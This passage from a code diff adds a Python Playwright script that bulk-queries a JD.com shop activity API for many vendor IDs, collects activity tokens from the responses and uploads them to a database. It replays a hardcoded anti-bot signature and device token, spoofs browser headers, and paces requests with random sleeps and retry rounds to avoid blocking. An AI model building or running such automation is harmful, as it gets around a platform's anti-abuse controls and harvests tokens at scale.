+                                              "sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Google Chrome\";v=\"145\", \"Chromium\";v=\"145\"",
+                                              "sec-ch-ua-mobile": "?0",
+                                              "sec-ch-ua-platform": "\"Windows\"",
+                                              "sec-fetch-dest": "empty",
+                                              "sec-fetch-mode": "cors",
+                                              "sec-fetch-site": "same-site",
+                                              "x-referer-page": "https://shop.m.jd.com/shop/home",
+                                              "x-rp-client": "h5_1.0.0"}},
+                                "body": "functionId=whx_getShopHomeActivityInfo&body=%7B%22venderId%22%3A%22{vid}%22%2C%22source%22%3A%22m-shop%22%7D&t=1770819694395&appid=shop_m_jd_com&clientVersion=11.0.0&client=wh5&area=1_72_2799_0&screen=2880*1920&uuid=17708115052001228857295&xAPIClientLanguage=zh_CN&h5st=20260211222138060%3Bwz6mawii96hhwq34%3Bea491%3Btk03wb1e11c7e18ndJpbT6LBMcwGg2s88Liyt_M5n533NhyhltvDDrxKkqBrjNfNijd4G3MHR0d0UgAFHWppJHyOQxwM%3Be930fb87d5eb5abfe4161b2422f335444b7e75b6f1069563e9308813cf2d8b51%3B5.2%3B1770819695060%3BeVxhk4BZtVOFqAbHr9OH4EKJ0I_DqYfZnZfF7YfZB5hWvZeZnZ-G_U7ZBh-f1ZPIt9_VwNOV9c_I8I7Uv9OJwRLTtNuVrRbV-MuU8IrU7YfZnZfFbwrI-MrE-hfZXx-ZuVrJsRLT8IrVtJbT8MLU98uVwJ_IqdOV-QLU7MbIqV7ZB5_Zuc7EzcrJ-hfZXx-Zwt-ZB5_ZtN6J-hfZXx-Zop-VzN_ECMbG4IrKsB7ZB5_ZrYfZB5hW-1LEXwNHRgqFoZeM8Y6ZB5_Z0kbIzc7F-hfZXx-ZvV_G4E8ZB5_Z7g6ZBh-f1taZB5BZyI9ZB5_ZudOE-YfZBhfZXx-VB5_ZwdOE-YfZBhfZXxfUwh-T-hOVsY7ZBhfZB5hWptfZnZ-VwN6J-hfZBh-f1ZfP01rIOULVvVsU-YfZnZPGyQ7GAY6ZBhfZB5hWxh-T-BOE-YfZBhfZXxfVB5_ZqN6J-hfZBh-f1JeZnZ-UsY7ZBhfZB5hWxh-T-NOE-YfZBhfZXxfVB5_ZtN6J-hfZBh-f1ROUB5_ZuN6J-hfZBh-f1ZPUzd_WxZfZnZPVsY7ZBhfZB5hWxh-T-1rE-hfZBh-f1NeZnZvF1YfZBhfZXxfVB5_Z1YfZBhfZXxfVB5_Z9E6ZBhfZB5xDB5_Z9oLItAKI-hfZXxPCmg-T-haF-hfZXx-ZtJeDB1eUrpLHKgvTxpfVwhfMTgvFqkbIz8rM-h-T-dLEuYfZB5xD%3Ba8dc368de986532e861d0509f14ed7a2c4b16326d7bdebc6a766f1ab0c4b7513%3BgRaW989Gy8bE_oLE7w-Gy8rFvM7MtoLI4wrJ1R6G88bG_wPD9k7J1RLHxgKJ&x-api-eid-token=jdd03L7W7SYDWCH7IJBMJDER7RQDJZP3TJWTTUEQSTSXDFVS7IXP7ZIEHS4U3ECNYQXFDIQH72VCDGRIRK2JXPNOPMWIXGYAAAAM4JUJA67IAAAAACO5KDV4HC7ZGNQX",
+                                "mode": "cors",
+                                "credentials": "include"}});
+                            return await res.json();
+                        }} catch (e) {{
+                            return {{ code: "-1", msg: e.toString() }};
+                        }}
+                    }}
+                    """
+                    res_json = page.evaluate(fetch_script)
+
+                    if res_json and res_json.get("code") == "0":
+                        stats["success"] += 1
+                        consecutive_errors = 0
+                        isv_url = res_json.get("result", {}).get("signStatus", {}).get("isvUrl", "")
+                        if TARGET_PATTERN in isv_url:
+                            token = re.search(r'token=([^&]+)', isv_url).group(1) if "token=" in isv_url else "N/A"
+                            log(f"{round_tag}{stats['total_scanned']}->🎯 命中 {vid} | Token: {token}", "SUCCESS")
+                            db_token.upload({"vender": vid, "token": token})
+                            stats["hit"] += 1
+                        else:
+                            log(f"{round_tag}{stats['total_scanned']}->店铺 {vid} 正常", "INFO")
+                    else:
+                        stats["error"] += 1
+                        consecutive_errors += 1
+                        log(f"{round_tag}{stats['total_scanned']}->店铺 {vid} 异常 code {res_json.get('code') if res_json else 'None'}", "WARN")
+                        round_failed.append(vid)
+                        cooldown_sleep(consecutive_errors)
+                        if consecutive_errors >= MAX_CONSECUTIVE_ERRORS:
+                            log(f"连续异常达上限，中断本轮", "ERROR")
+                            return False, round_failed
+
+                except Exception as e:
+                    consecutive_errors += 1
+                    stats["error"] += 1
+                    log(f"{round_tag}{stats['total_scanned']}->页面崩溃 {vid}: {e}", "WARN")
+                    round_failed.append(vid)
+                    if consecutive_errors >= MAX_CONSECUTIVE_ERRORS: return False, round_failed
+                    cooldown_sleep(consecutive_errors)
+                finally:
+                    page.close()
+                    time.sleep(random.uniform(4, 6))
+            
+            return True, round_failed
+
+        # --- 核心循环重试逻辑 ---
+        for attempt in range(MAX_RETRY_ROUNDS + 1):
+            if not pending_vids:
+                break
+            
+            tag = "[初次]" if attempt == 0 else f"[重试{attempt}]"
+            if attempt > 0:
+                log(f"🔄 开始 {tag} 扫描，剩余失败条数: {len(pending_vids)}", "STATS")
+                time.sleep(5) # 轮次切换稍作休息
+
+            is_ok, failed_list = scan_round(pending_vids, tag)
+            pending_vids = failed_list # 下一轮只查这一轮失败的
+            
+            if not is_ok: # 如果因为时长或连续错误中断，跳出大循环
+                break
+        stats['blocked']=len(pending_vids);
+        log(f"任务结束 | 总量: {len(vender_ids)} | 成功: {stats['success']} | 最终失败: {len(pending_vids)}", "STATS")
+        db_msg.upload({"idx": f"{REPO}.{script_idx}", "stats": stats})
+        browser.close()
+
+if __name__ == "__main__":
+    run_task()
